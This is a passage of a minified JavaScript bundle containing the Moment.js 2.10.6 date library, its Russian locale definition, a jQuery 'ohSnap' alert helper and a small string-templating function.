        return Math.floor(+this / 1000)
    }

    function an() {
        return this._offset ? new Date(+this) : this._d
    }

    function e3() {
        var b = this;
        return [b.year(), b.month(), b.date(), b.hour(), b.minute(), b.second(), b.millisecond()]
    }

    function eG() {
        var b = this;
        return {
            years: b.year(),
            months: b.month(),
            date: b.date(),
            hours: b.hours(),
            minutes: b.minutes(),
            seconds: b.seconds(),
            milliseconds: b.milliseconds()
        }
    }

    function b4() {
        return di(this)
    }

    function bJ() {
        return dq({}, dk(this))
    }

    function bs() {
        return dk(this).overflow
    }

    function a6(d, c) {
        d8(0, [d, d.length], 0, c)
    }

    function aP(e, d, f) {
        return aT(a8([e, 11, 31 + d - f]), d, f).week
    }

    function ay(d) {
        var c = aT(this, this.localeData()._week.dow, this.localeData()._week.doy).year;
        return null == d ? c : this.add(d - c, "y")
    }

    function e9(d) {
        var c = aT(this, 1, 4).year;
        return null == d ? c : this.add(d - c, "y")
    }

    function eS() {
        return aP(this.year(), 1, 4)
    }

    function ev() {
        var b = this.localeData()._week;
        return aP(this.year(), b.dow, b.doy)
    }

    function dE(b) {
        return null == b ? Math.ceil((this.month() + 1) / 3) : this.month(3 * (b - 1) + this.month() % 3)
    }

    function cP(d, c) {
        return "string" != typeof d ? d : isNaN(d) ? (d = c.weekdaysParse(d), "number" == typeof d ? d : null) : parseInt(d, 10)
    }

    function cy(b) {
        return this._weekdays[b.day()]
    }

    function ch(b) {
        return this._weekdaysShort[b.day()]
    }

    function bR(b) {
        return this._weekdaysMin[b.day()]
    }

    function bA(f) {
        var e, h, g;
        for (this._weekdaysParse = this._weekdaysParse || [], e = 0; 7 > e; e++) {
            if (this._weekdaysParse[e] || (h = a8([2000, 1]).day(e), g = "^" + this.weekdays(h, "") + "|^" + this.weekdaysShort(h, "") + "|^" + this.weekdaysMin(h, ""), this._weekdaysParse[e] = new RegExp(g.replace(".", ""), "i")), this._weekdaysParse[e].test(f)) {
                return e
            }
        }
    }

    function bj(d) {
        var c = this._isUTC ? this._d.getUTCDay() : this._d.getDay();
        return null != d ? (d = cP(d, this.localeData()), this.add(d - c, "d")) : c
    }

    function aX(d) {
        var c = (this.day() + 7 - this.localeData()._week.dow) % 7;
        return null == d ? c : this.add(d - c, "d")
    }

    function aG(b) {
        return null == b ? this.day() || 7 : this.day(this.day() % 7 ? b : b - 7)
    }

    function ak(d, c) {
        d8(d, 0, 0, function() {
            return this.localeData().meridiem(this.hours(), this.minutes(), c)
        })
    }

    function e0(d, c) {
        return c._meridiemParse
    }

    function eD(b) {
        return "p" === (b + "").toLowerCase().charAt(0)
    }

    function dS(e, d, f) {
        return e > 11 ? f ? "pm" : "PM" : f ? "am" : "AM"
    }

    function c4(d, c) {
        c[e8] = c6(1000 * ("0." + d))
    }

    function cF() {
        return this._isUTC ? "UTC" : ""
    }

    function co() {
        return this._isUTC ? "Coordinated Universal Time" : ""
    }

    function bY(b) {
        return a8(1000 * b)
    }

    function ep() {
        return a8.apply(null, arguments).parseZone()
    }

    function ar(f, e, h) {
        var g = this._calendar[f];
        return "function" == typeof g ? g.call(e, h) : g
    }

    function eK(e) {
        var d = this._longDateFormat[e],
            f = this._longDateFormat[e.toUpperCase()];
        return d || !f ? d : (this._longDateFormat[e] = f.replace(/MMMM|MM|DD|dddd/g, function(b) {
            return b.slice(1)
        }), this._longDateFormat[e])
    }

    function d6() {
        return this._invalidDate
    }

    function dn(b) {
        return this._ordinal.replace("%d", b)
    }

    function cJ(b) {
        return b
    }

    function cs(g, f, k, j) {
        var h = this._relativeTime[k];
        return "function" == typeof h ? h(g, f, k, j) : h.replace(/%d/i, g)
    }

    function b5(e, d) {
        var f = this._relativeTime[e > 0 ? "future" : "past"];
        return "function" == typeof f ? f(d) : f.replace(/%s/i, d)
    }

    function bK(e) {
        var d, f;
        for (f in e) {
            d = e[f], "function" == typeof d ? this[f] = d : this["_" + f] = d
        }
        this._ordinalParseLenient = new RegExp(this._ordinalParse.source + "|" + /\d{1,2}/.source)
    }

    function bt(h, g, m, l) {
        var k = cV(),
            j = dp().set(l, g);
        return k[m](j, h)
    }

    function a7(j, h, o, n, m) {
        if ("number" == typeof j && (h = j, j = void 0), j = j || "", null != h) {
            return bt(j, h, o, m)
        }
        var l, k = [];
        for (l = 0; n > l; l++) {
            k[l] = bt(j, l, o, m)
        }
        return k
    }

    function aQ(d, c) {
        return a7(d, c, "months", 12, "month")
    }

    function az(d, c) {
        return a7(d, c, "monthsShort", 12, "month")
    }

    function ff(d, c) {
        return a7(d, c, "weekdays", 7, "day")
    }

    function eT(d, c) {
        return a7(d, c, "weekdaysShort", 7, "day")
    }

    function ew(d, c) {
        return a7(d, c, "weekdaysMin", 7, "day")
    }

    function dF() {
        var b = this._data;
        return this._milliseconds = c0(this._milliseconds), this._days = c0(this._days), this._months = c0(this._months), b.milliseconds = c0(b.milliseconds), b.seconds = c0(b.seconds), b.minutes = c0(b.minutes), b.hours = c0(b.hours), b.months = c0(b.months), b.years = c0(b.years), this
    }

    function cQ(g, f, k, j) {
        var h = cp(f, k);
        return g._milliseconds += j * h._milliseconds, g._days += j * h._days, g._months += j * h._months, g._bubble()
    }

    function cz(d, c) {
        return cQ(this, d, c, 1)
    }

    function ci(d, c) {
        return cQ(this, d, c, -1)
    }

    function bS(b) {
        return 0 > b ? Math.floor(b) : Math.ceil(b)
    }

    function bB() {
        var r, q, p, o, n, m = this._milliseconds,
            l = this._days,
            k = this._months,
            j = this._data;
        return m >= 0 && l >= 0 && k >= 0 || 0 >= m && 0 >= l && 0 >= k || (m += 86400000 * bS(aY(k) + l), l = 0, k = 0), j.milliseconds = m % 1000, r = c8(m / 1000), j.seconds = r % 60, q = c8(r / 60), j.minutes = q % 60, p = c8(q / 60), j.hours = p % 24, l += c8(p / 24), n = c8(bk(l)), k += n, l -= bS(aY(n)), o = c8(k / 12), k %= 12, j.days = l, j.months = k, j.years = o, this
    }

    function bk(b) {
        return 4800 * b / 146097
    }

    function aY(b) {
        return 146097 * b / 4800
    }

    function aH(f) {
        var e, h, g = this._milliseconds;
        if (f = eq(f), "month" === f || "year" === f) {
            return e = this._days + g / 86400000, h = this._months + bk(e), "month" === f ? h : h / 12
        }
        switch (e = this._days + Math.round(aY(this._months)), f) {
            case "week":
                return e / 7 + g / 604800000;
            case "day":
                return e + g / 86400000;
            case "hour":
                return 24 * e + g / 3600000;
            case "minute":
                return 1440 * e + g / 60000;
            case "second":
                return 86400 * e + g / 1000;
            case "millisecond":
                return Math.floor(86400000 * e) + g;
            default:
                throw new Error("Unknown unit " + f)
        }
    }

    function al() {
        return this._milliseconds + 86400000 * this._days + this._months % 12 * 2592000000 + 31536000000 * c6(this._months / 12)
    }

    function e1(b) {
        return function() {
            return this.as(b)
        }
    }

    function eE(b) {
        return b = eq(b), this[b + "s"]()
    }

    function b2(b) {
        return function() {
            return this._data[b]
        }
    }

    function bH() {
        return c8(this.days() / 7)
    }

    function bq(g, f, k, j, h) {
        return h.relativeTime(f || 1, !!k, g, j)
    }

    function a4(w, u, t) {
        var s = cp(w).abs(),
            r = av(s.as("s")),
            q = av(s.as("m")),
            p = av(s.as("h")),
            o = av(s.as("d")),
            n = av(s.as("M")),
            m = av(s.as("y")),
            l = r < e6.s && ["s", r] || 1 === q && ["m"] || q < e6.m && ["mm", q] || 1 === p && ["h"] || p < e6.h && ["hh", p] || 1 === o && ["d"] || o < e6.d && ["dd", o] || 1 === n && ["M"] || n < e6.M && ["MM", n] || 1 === m && ["y"] || ["yy", m];
        return l[2] = u, l[3] = +w > 0, l[4] = t, bq.apply(null, l)
    }

    function aN(d, c) {
        return void 0 === e6[d] ? !1 : void 0 === c ? e6[d] : (e6[d] = c, !0)
    }

    function aw(e) {
        var d = this.localeData(),
            f = a4(this, !e, d);
        return e && (f = d.pastFuture(+this, f)), d.postformat(f)
    }

    function e7() {
        var A, z, y, x = eP(this._milliseconds) / 1000,
            w = eP(this._days),
            u = eP(this._months);
        A = c8(x / 60), z = c8(A / 60), x %= 60, A %= 60, y = c8(u / 12), u %= 12;
        var t = y,
            s = u,
            r = w,
            q = z,
            p = A,
            o = x,
            n = this.asSeconds();
        return n ? (0 > n ? "-" : "") + "P" + (t ? t + "Y" : "") + (s ? s + "M" : "") + (r ? r + "D" : "") + (q || p || o ? "T" : "") + (q ? q + "H" : "") + (p ? p + "M" : "") + (o ? o + "S" : "") : "P0D"
    }
    var eQ, es, dB = dy.momentProperties = [],
        cN = !1,
        cw = {},
        cf = {},
        bP = /(\[[^\[]*\])|(\\)?(Mo|MM?M?M?|Do|DDDo|DD?D?D?|ddd?d?|do?|w[o|w]?|W[o|W]?|Q|YYYYYY|YYYYY|YYYY|YY|gg(ggg?)?|GG(GGG?)?|e|E|a|A|hh?|HH?|mm?|ss?|S{1,9}|x|X|zz?|ZZ?|.)/g,
        by = /(\[[^\[]*\])|(\\)?(LTS|LT|LL?L?L?|l{1,4})/g,
        bh = {},
        aV = {},
        aE = /\d/,
        ai = /\d\d/,
        eY = /\d{3}/,
        eB = /\d{4}/,
        dQ = /[+-]?\d{6}/,
        c2 = /\d\d?/,
        cE = /\d{1,3}/,
        cn = /\d{1,4}/,
        bX = /[+-]?\d{1,6}/,
        em = /\d+/,
        aq = /[+-]?\d+/,
        eJ = /Z|[+-]\d\d:?\d\d/gi,
        d4 = /[+-]?\d+(\.\d{1,3})?/,
        dl = /[0-9]*['a-z\u00A0-\u05FF\u0700-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF]+|[\u0600-\u06FF\/]+(\s*?[\u0600-\u06FF]+){1,2}/i,
        cI = {},
        cr = {},
        b3 = 0,
        bI = 1,
        br = 2,
        a5 = 3,
        aO = 4,
        ax = 5,
        e8 = 6;
    d8("M", ["MM", 2], "Mo", function() {
        return this.month() + 1
    }), d8("MMM", 0, 0, function(b) {
        return this.localeData().monthsShort(this, b)
    }), d8("MMMM", 0, 0, function(b) {
        return this.localeData().months(this, b)
    }), cT("month", "M"), dZ("M", c2), dZ("MM", c2, ai), dZ("MMM", dl), dZ("MMMM", dl), dW(["M", "MM"], function(d, c) {
        c[bI] = c6(d) - 1
    }), dW(["MMM", "MMMM"], function(g, f, k, j) {
        var h = k._locale.monthsParse(g, j, k._strict);
        null != h ? f[bI] = h : dk(k).invalidMonth = g
    });
    var eR = "January_February_March_April_May_June_July_August_September_October_November_December".split("_"),
        eu = "Jan_Feb_Mar_Apr_May_Jun_Jul_Aug_Sep_Oct_Nov_Dec".split("_"),
        dD = {};
    dy.suppressDeprecationWarnings = !1;
    var cO = /^\s*(?:[+-]\d{6}|\d{4})-(?:(\d\d-\d\d)|(W\d\d$)|(W\d\d-\d)|(\d\d\d))((T| )(\d\d(:\d\d(:\d\d(\.\d+)?)?)?)?([\+\-]\d\d(?::?\d\d)?|\s*Z)?)?$/,
        cx = [
            ["YYYYYY-MM-DD", /[+-]\d{6}-\d{2}-\d{2}/],
            ["YYYY-MM-DD", /\d{4}-\d{2}-\d{2}/],
            ["GGGG-[W]WW-E", /\d{4}-W\d{2}-\d/],
            ["GGGG-[W]WW", /\d{4}-W\d{2}/],
            ["YYYY-DDD", /\d{4}-\d{3}/]
        ],
        cg = [
            ["HH:mm:ss.SSSS", /(T| )\d\d:\d\d:\d\d\.\d+/],
            ["HH:mm:ss", /(T| )\d\d:\d\d:\d\d/],
            ["HH:mm", /(T| )\d\d:\d\d/],
            ["HH", /(T| )\d\d/]
        ],
        bQ = /^\/?Date\((\-?\d+)/i;
    dy.createFromInputFallback = eM("moment construction falls back to js Date. This is discouraged and will be removed in upcoming major release. Please refer to https://github.com/moment/moment/issues/1407 for more info.", function(b) {
        b._d = new Date(b._i + (b._useUTC ? " UTC" : ""))
    }), d8(0, ["YY", 2], 0, function() {
        return this.year() % 100
    }), d8(0, ["YYYY", 4], 0, "year"), d8(0, ["YYYYY", 5], 0, "year"), d8(0, ["YYYYYY", 6, !0], 0, "year"), cT("year", "y"), dZ("Y", aq), dZ("YY", c2, ai), dZ("YYYY", cn, eB), dZ("YYYYY", bX, dQ), dZ("YYYYYY", bX, dQ), dW(["YYYYY", "YYYYYY"], b3), dW("YYYY", function(a, d) {
        d[b3] = 2 === a.length ? dy.parseTwoDigitYear(a) : c6(a)
    }), dW("YY", function(a, d) {
        d[b3] = dy.parseTwoDigitYear(a)
    }), dy.parseTwoDigitYear = function(b) {
        return c6(b) + (c6(b) > 68 ? 1900 : 2000)
    };
    var bz = el("FullYear", !1);
    d8("w", ["ww", 2], "wo", "week"), d8("W", ["WW", 2], "Wo", "isoWeek"), cT("week", "w"), cT("isoWeek", "W"), dZ("w", c2), dZ("ww", c2, ai), dZ("W", c2), dZ("WW", c2, ai), dU(["w", "ww", "W", "WW"], function(f, e, h, g) {
        e[g.substr(0, 1)] = c6(f)
    });
    var bi = {
        dow: 0,
        doy: 6
    };
    d8("DDD", ["DDDD", 3], "DDDo", "dayOfYear"), cT("dayOfYear", "DDD"), dZ("DDD", cE), dZ("DDDD", eY), dW(["DDD", "DDDD"], function(e, d, f) {
        f._dayOfYear = c6(e)
    }), dy.ISO_8601 = function() {};
    var aW = eM("moment().min is deprecated, use moment.min instead. https://github.com/moment/moment/issues/1548", function() {
            var b = a8.apply(null, arguments);
            return this > b ? this : b
        }),
        aF = eM("moment().max is deprecated, use moment.max instead. https://github.com/moment/moment/issues/1548", function() {
            var b = a8.apply(null, arguments);
            return b > this ? this : b
        });
    dG("Z", ":"), dG("ZZ", ""), dZ("Z", eJ), dZ("ZZ", eJ), dW(["Z", "ZZ"], function(e, d, f) {
        f._useUTC = !0, f._tzm = cR(e)
    });
    var aj = /([\+\-]|\d\d)/gi;
    dy.updateOffset = function() {};
    var eZ = /(\-)?(?:(\d*)\.)?(\d+)\:(\d+)(?:\:(\d+)\.?(\d{3})?)?/,
        eC = /^(-)?P(?:(?:([0-9,.]*)Y)?(?:([0-9,.]*)M)?(?:([0-9,.]*)D)?(?:T(?:([0-9,.]*)H)?(?:([0-9,.]*)M)?(?:([0-9,.]*)S)?)?|([0-9,.]*)W)$/;
    cp.fn = eU.prototype;
    var b0 = eL(1, "add"),
        bF = eL(-1, "subtract");
    dy.defaultFormat = "YYYY-MM-DDTHH:mm:ssZ";
    var bo = eM("moment().lang() is deprecated. Instead, use moment().localeData() to get the language configuration. Use moment().locale() to change languages.", function(b) {
        return void 0 === b ? this.localeData() : this.locale(b)
    });
    d8(0, ["gg", 2], 0, function() {
        return this.weekYear() % 100
    }), d8(0, ["GG", 2], 0, function() {
        return this.isoWeekYear() % 100
    }), a6("gggg", "weekYear"), a6("ggggg", "weekYear"), a6("GGGG", "isoWeekYear"), a6("GGGGG", "isoWeekYear"), cT("weekYear", "gg"), cT("isoWeekYear", "GG"), dZ("G", aq), dZ("g", aq), dZ("GG", c2, ai), dZ("gg", c2, ai), dZ("GGGG", cn, eB), dZ("gggg", cn, eB), dZ("GGGGG", bX, dQ), dZ("ggggg", bX, dQ), dU(["gggg", "ggggg", "GGGG", "GGGGG"], function(f, e, h, g) {
        e[g.substr(0, 2)] = c6(f)
    }), dU(["gg", "GG"], function(a, h, g, f) {
        h[f] = dy.parseTwoDigitYear(a)
    }), d8("Q", 0, 0, "quarter"), cT("quarter", "Q"), dZ("Q", aE), dW("Q", function(d, c) {
        c[bI] = 3 * (c6(d) - 1)
    }), d8("D", ["DD", 2], "Do", "date"), cT("date", "D"), dZ("D", c2), dZ("DD", c2, ai), dZ("Do", function(d, c) {
        return d ? c._ordinalParse : c._ordinalParseLenient
    }), dW(["D", "DD"], br), dW("Do", function(d, c) {
        c[br] = c6(d.match(c2)[0], 10)
    });
    var a2 = el("Date", !0);
    d8("d", 0, "do", "day"), d8("dd", 0, 0, function(b) {
        return this.localeData().weekdaysMin(this, b)
    }), d8("ddd", 0, 0, function(b) {
        return this.localeData().weekdaysShort(this, b)
    }), d8("dddd", 0, 0, function(b) {
        return this.localeData().weekdays(this, b)
    }), d8("e", 0, 0, "weekday"), d8("E", 0, 0, "isoWeekday"), cT("day", "d"), cT("weekday", "e"), cT("isoWeekday", "E"), dZ("d", c2), dZ("e", c2), dZ("E", c2), dZ("dd", dl), dZ("ddd", dl), dZ("dddd", dl), dU(["dd", "ddd", "dddd"], function(f, e, h) {
        var g = h._locale.weekdaysParse(f);
        null != g ? e.d = g : dk(h).invalidWeekday = f
    }), dU(["d", "e", "E"], function(f, e, h, g) {
        e[g] = c6(f)
    });
    var aL = "Sunday_Monday_Tuesday_Wednesday_Thursday_Friday_Saturday".split("_"),
        au = "Sun_Mon_Tue_Wed_Thu_Fri_Sat".split("_"),
        e5 = "Su_Mo_Tu_We_Th_Fr_Sa".split("_");
    d8("H", ["HH", 2], 0, "hour"), d8("h", ["hh", 2], 0, function() {
        return this.hours() % 12 || 12
    }), ak("a", !0), ak("A", !1), cT("hour", "h"), dZ("a", e0), dZ("A", e0), dZ("H", c2), dZ("h", c2), dZ("HH", c2, ai), dZ("hh", c2, ai), dW(["H", "HH"], a5), dW(["a", "A"], function(e, d, f) {
        f._isPm = f._locale.isPM(e), f._meridiem = e
    }), dW(["h", "hh"], function(e, d, f) {
        d[a5] = c6(e), dk(f).bigHour = !0
    });
    var eO = /[ap]\.?m?\.?/i,
        eo = el("Hours", !0);
    d8("m", ["mm", 2], 0, "minute"), cT("minute", "m"), dZ("m", c2), dZ("mm", c2, ai), dW(["m", "mm"], aO);
    var dz = el("Minutes", !1);
    d8("s", ["ss", 2], 0, "second"), cT("second", "s"), dZ("s", c2), dZ("ss", c2, ai), dW(["s", "ss"], ax);
    var cM = el("Seconds", !1);
    d8("S", 0, 0, function() {
        return ~~(this.millisecond() / 100)
    }), d8(0, ["SS", 2], 0, function() {
        return ~~(this.millisecond() / 10)
    }), d8(0, ["SSS", 3], 0, "millisecond"), d8(0, ["SSSS", 4], 0, function() {
        return 10 * this.millisecond()
    }), d8(0, ["SSSSS", 5], 0, function() {
        return 100 * this.millisecond()
    }), d8(0, ["SSSSSS", 6], 0, function() {
        return 1000 * this.millisecond()
    }), d8(0, ["SSSSSSS", 7], 0, function() {
        return 10000 * this.millisecond()
    }), d8(0, ["SSSSSSSS", 8], 0, function() {
        return 100000 * this.millisecond()
    }), d8(0, ["SSSSSSSSS", 9], 0, function() {
        return 1000000 * this.millisecond()
    }), cT("millisecond", "ms"), dZ("S", cE, aE), dZ("SS", cE, ai), dZ("SSS", cE, eY);
    var cv;
    for (cv = "SSSS"; cv.length <= 9; cv += "S") {
        dZ(cv, em)
    }
    for (cv = "S"; cv.length <= 9; cv += "S") {
        dW(cv, c4)
    }
    var b9 = el("Milliseconds", !1);
    d8("z", 0, 0, "zoneAbbr"), d8("zz", 0, 0, "zoneName");
    var bO = df.prototype;
    bO.add = b0, bO.calendar = dr, bO.clone = cK, bO.diff = a9, bO.endOf = bm, bO.format = eV, bO.from = ey, bO.fromNow = dH, bO.to = cS, bO.toNow = cB, bO.get = eh, bO.invalidAt = bs, bO.isAfter = ct, bO.isBefore = b7, bO.isBetween = bM, bO.isSame = bv, bO.isValid = b4, bO.lang = bo, bO.locale = ck, bO.localeData = bU, bO.max = aF, bO.min = aW, bO.parsingFlags = bJ, bO.set = eh, bO.startOf = bD, bO.subtract = bF, bO.toArray = e3, bO.toObject = eG, bO.toDate = an, bO.toISOString = af, bO.toJSON = af, bO.toString = aB, bO.unix = aJ, bO.valueOf = a0, bO.year = bz, bO.isLeapYear = bf, bO.weekYear = ay, bO.isoWeekYear = e9, bO.quarter = bO.quarters = dE, bO.month = dK, bO.daysInMonth = dJ, bO.week = bO.weeks = ez, bO.isoWeek = bO.isoWeeks = dI, bO.weeksInYear = ev, bO.isoWeeksInYear = eS, bO.date = a2, bO.day = bO.days = bj, bO.weekday = aX, bO.isoWeekday = aG, bO.dayOfYear = cC, bO.hour = bO.hours = eo, bO.minute = bO.minutes = dz, bO.second = bO.seconds = cM, bO.millisecond = bO.milliseconds = b9, bO.utcOffset = bT, bO.utc = bl, bO.local = aZ, bO.parseZone = aI, bO.hasAlignedHourOffset = am, bO.isDST = e2, bO.isDSTShifted = eF, bO.isLocal = dV, bO.isUtcOffset = c7, bO.isUtc = cG, bO.isUTC = cG, bO.zoneAbbr = cF, bO.zoneName = co, bO.dates = eM("dates accessor is deprecated. Use date instead.", a2), bO.months = eM("months accessor is deprecated. Use month instead", dK), bO.years = eM("years accessor is deprecated. Use year instead", bz), bO.zone = eM("moment().zone is deprecated, use moment().utcOffset instead. https://github.com/moment/moment/issues/1779", bC);
    var bx = bO,
        bg = {
            sameDay: "[Today at] LT",
            nextDay: "[Tomorrow at] LT",
            nextWeek: "dddd [at] LT",
            lastDay: "[Yesterday at] LT",
            lastWeek: "[Last] dddd [at] LT",
            sameElse: "L"
        },
        aU = {
            LTS: "h:mm:ss A",
            LT: "h:mm A",
            L: "MM/DD/YYYY",
            LL: "MMMM D, YYYY",
            LLL: "MMMM D, YYYY h:mm A",
            LLLL: "dddd, MMMM D, YYYY h:mm A"
        },
        aD = "Invalid date",
        ah = "%d",
        eX = /\d{1,2}/,
        eA = {
            future: "in %s",
            past: "%s ago",
            s: "a few seconds",
            m: "a minute",
            mm: "%d minutes",
            h: "an hour",
            hh: "%d hours",
            d: "a day",
            dd: "%d days",
            M: "a month",
            MM: "%d months",
            y: "a year",
            yy: "%d years"
        },
        dO = c3.prototype;
    dO._calendar = bg, dO.calendar = ar, dO._longDateFormat = aU, dO.longDateFormat = eK, dO._invalidDate = aD, dO.invalidDate = d6, dO._ordinal = ah, dO.ordinal = dn, dO._ordinalParse = eX, dO.preparse = cJ, dO.postformat = cJ, dO._relativeTime = eA, dO.relativeTime = cs, dO.pastFuture = b5, dO.set = bK, dO.months = dP, dO._months = eR, dO.monthsShort = dN, dO._monthsShort = eu, dO.monthsParse = dM, dO.week = aC, dO._week = bi, dO.firstDayOfYear = eW, dO.firstDayOfWeek = ag, dO.weekdays = cy, dO._weekdays = aL, dO.weekdaysMin = bR, dO._weekdaysMin = e5, dO.weekdaysShort = ch, dO._weekdaysShort = au, dO.weekdaysParse = bA, dO.isPM = eD, dO._meridiemParse = eO, dO.meridiem = dS, cX("en", {
        ordinalParse: /\d{1,2}(th|st|nd|rd)/,
        ordinal: function(e) {
            var d = e % 10,
                f = 1 === c6(e % 100 / 10) ? "th" : 1 === d ? "st" : 2 === d ? "nd" : 3 === d ? "rd" : "th";
            return e + f
        }
    }), dy.lang = eM("moment.lang is deprecated. Use moment.locale instead.", cX), dy.langData = eM("moment.langData is deprecated. Use moment.localeData instead.", cV);
    var c0 = Math.abs,
        cD = e1("ms"),
        cm = e1("s"),
        bW = e1("m"),
        ek = e1("h"),
        ap = e1("d"),
        eI = e1("w"),
        d2 = e1("M"),
        dj = e1("y"),
        cH = b2("milliseconds"),
        cq = b2("seconds"),
        b1 = b2("minutes"),
        bG = b2("hours"),
        bp = b2("days"),
        a3 = b2("months"),
        aM = b2("years"),
        av = Math.round,
        e6 = {
            s: 45,
            m: 45,
            h: 22,
            d: 26,
            M: 11
        },
        eP = Math.abs,
        er = eU.prototype;
    er.abs = dF, er.add = cz, er.subtract = ci, er.as = aH, er.asMilliseconds = cD, er.asSeconds = cm, er.asMinutes = bW, er.asHours = ek, er.asDays = ap, er.asWeeks = eI, er.asMonths = d2, er.asYears = dj, er.valueOf = al, er._bubble = bB, er.get = eE, er.milliseconds = cH, er.seconds = cq, er.minutes = b1, er.hours = bG, er.days = bp, er.weeks = bH, er.months = a3, er.years = aM, er.humanize = aw, er.toISOString = e7, er.toString = e7, er.toJSON = e7, er.locale = ck, er.localeData = bU, er.toIsoString = eM("toIsoString() is deprecated. Please use toISOString() instead (notice the capitals)", e7), er.lang = bo, d8("X", 0, 0, "unix"), d8("x", 0, 0, "valueOf"), dZ("x", aq), dZ("X", d4), dW("X", function(e, d, f) {
        f._d = new Date(1000 * parseFloat(e, 10))
    }), dW("x", function(e, d, f) {
        f._d = new Date(c6(e))
    }), dy.version = "2.10.6", dx(a8), dy.fn = bx, dy.min = aA, dy.max = fg, dy.utc = dp, dy.unix = bY, dy.months = aQ, dy.isDate = dv, dy.locale = cX, dy.invalid = dh, dy.duration = cp, dy.isMoment = c9, dy.weekdays = ff, dy.parseZone = ep, dy.localeData = cV, dy.isDuration = ex, dy.monthsShort = az, dy.weekdaysMin = ew, dy.defineLocale = cW, dy.weekdaysShort = eT, dy.normalizeUnits = eq, dy.relativeTimeThreshold = aN;
    var dA = dy;
    return dA
});

function ru__plural(c, b) {
    var a = c.split("_");
    return b % 10 === 1 && b % 100 !== 11 ? a[0] : (b % 10 >= 2 && b % 10 <= 4 && (b % 100 < 10 || b % 100 >= 20) ? a[1] : a[2])
}

function ru__relativeTimeWithPlural(c, b, a) {
    var d = {
        mm: b ? "минута_минуты_минут" : "минуту_минуты_минут",
        hh: "час_часа_часов",
        dd: "день_дня_дней",
        MM: "месяц_месяца_месяцев",
        yy: "год_года_лет"
    };
    if (a === "m") {
        return b ? "минута" : "минуту"
    } else {
        return c + " " + ru__plural(d[a], +c)
    }
}

function ru__monthsCaseReplace(b, d) {
    var a = {
            nominative: "январь_февраль_март_апрель_май_июнь_июль_август_сентябрь_октябрь_ноябрь_декабрь".split("_"),
            accusative: "января_февраля_марта_апреля_мая_июня_июля_августа_сентября_октября_ноября_декабря".split("_")
        },
        c = (/D[oD]?(\[[^\[\]]*\]|\s+)+MMMM?/).test(d) ? "accusative" : "nominative";
    return a[c][b.month()]
}

function ru__monthsShortCaseReplace(a, d) {
    var c = {
            nominative: "янв_фев_март_апр_май_июнь_июль_авг_сен_окт_ноя_дек".split("_"),
            accusative: "янв_фев_мар_апр_мая_июня_июля_авг_сен_окт_ноя_дек".split("_")
        },
        b = (/D[oD]?(\[[^\[\]]*\]|\s+)+MMMM?/).test(d) ? "accusative" : "nominative";
    return c[b][a.month()]
}

function ru__weekdaysCaseReplace(a, d) {
    var b = {
            nominative: "воскресенье_понедельник_вторник_среда_четверг_пятница_суббота".split("_"),
            accusative: "воскресенье_понедельник_вторник_среду_четверг_пятницу_субботу".split("_")
        },
        c = (/\[ ?[Вв] ?(?:прошлую|следующую|эту)? ?\] ?dddd/).test(d) ? "accusative" : "nominative";
    return b[c][a.day()]
}
moment.locale("ru", {
    months: ru__monthsCaseReplace,
    monthsShort: ru__monthsShortCaseReplace,
    weekdays: ru__weekdaysCaseReplace,
    weekdaysShort: "вс_пн_вт_ср_чт_пт_сб".split("_"),
    weekdaysMin: "вс_пн_вт_ср_чт_пт_сб".split("_"),
    monthsParse: [/^янв/i, /^фев/i, /^мар/i, /^апр/i, /^ма[й|я]/i, /^июн/i, /^июл/i, /^авг/i, /^сен/i, /^окт/i, /^ноя/i, /^дек/i],
    longDateFormat: {
        LT: "HH:mm",
        LTS: "HH:mm:ss",
        L: "DD.MM.YYYY",
        LL: "D MMMM YYYY г.",
        LLL: "D MMMM YYYY г., HH:mm",
        LLLL: "dddd, D MMMM YYYY г., HH:mm"
    },
    calendar: {
        sameDay: "[Сегодня в] LT",
        nextDay: "[Завтра в] LT",
        lastDay: "[Вчера в] LT",
        nextWeek: function() {
            return this.day() === 2 ? "[Во] dddd [в] LT" : "[В] dddd [в] LT"
        },
        lastWeek: function(a) {
            if (a.week() !== this.week()) {
                switch (this.day()) {
                    case 0:
                        return "[В прошлое] dddd [в] LT";
                    case 1:
                    case 2:
                    case 4:
                        return "[В прошлый] dddd [в] LT";
                    case 3:
                    case 5:
                    case 6:
                        return "[В прошлую] dddd [в] LT"
                }
            } else {
                if (this.day() === 2) {
                    return "[Во] dddd [в] LT"
                } else {
                    return "[В] dddd [в] LT"
                }
            }
        },
        sameElse: "L"
    },
    relativeTime: {
        future: "через %s",
        past: "%s назад",
        s: "несколько секунд",
        m: ru__relativeTimeWithPlural,
        mm: ru__relativeTimeWithPlural,
        h: "час",
        hh: ru__relativeTimeWithPlural,
        d: "день",
        dd: ru__relativeTimeWithPlural,
        M: "месяц",
        MM: ru__relativeTimeWithPlural,
        y: "год",
        yy: ru__relativeTimeWithPlural
    },
    meridiemParse: /ночи|утра|дня|вечера/i,
    isPM: function(a) {
        return /^(дня|вечера)$/.test(a)
    },
    meridiem: function(a, c, b) {
        if (a < 4) {
            return "ночи"
        } else {
            if (a < 12) {
                return "утра"
            } else {
                if (a < 17) {
                    return "дня"
                } else {
                    return "вечера"
                }
            }
        }
    },
    ordinalParse: /\d{1,2}-(й|го|я)/,
    ordinal: function(a, b) {
        switch (b) {
            case "M":
            case "d":
            case "DDD":
                return a + "-й";
            case "D":
                return a + "-го";
            case "w":
            case "W":
                return a + "-я";
            default:
                return a
        }
    },
    week: {
        dow: 1,
        doy: 7
    }
});

function ohSnap(g, b, d) {
    var a = "",
        c, e = "3000",
        f = $("#ohsnap");
    if (d) {
        a = "<span class='" + d + "'></span> "
    }
    c = $('<div class="alert alert-' + b + ' animated fadeInRight">' + a + g + "</div>").fadeIn("fast");
    f.append(c);
    c.on("click", function() {
        $(this).addClass("fadeOutRight").one("webkitAnimationEnd animationend", function() {
            $(this).remove()
        })
    });
    setTimeout(function() {
        c.addClass("fadeOutRight").one("webkitAnimationEnd animationend", function() {
            $(this).remove()
        })
    }, e)
}(function() {
    var a = {};
    this.tpl = function b(e, d) {
        var c = !/\W/.test(e) ? a[e] = a[e] || b(document.getElementById(e).innerHTML) : new Function("obj", "var p=[],print=function(){p.push.apply(p,arguments);};with(obj){p.push('" + e.replace(/[\r\t\n]/g, " ").split("<%").join("\t").replace(/((^|%>)[^\t]*)'/g, "$1\r").replace(/\t=(.*?)%>/g, "',$1,'").split("\t").join("');").split("%>").join("p.push('").split("\r").join("\\'") + "');}return p.join('');");
        return d ? c(d) : c
    }
})();
(function(a) {
    if (typeof module === "object" && typeof module.exports === "object") {
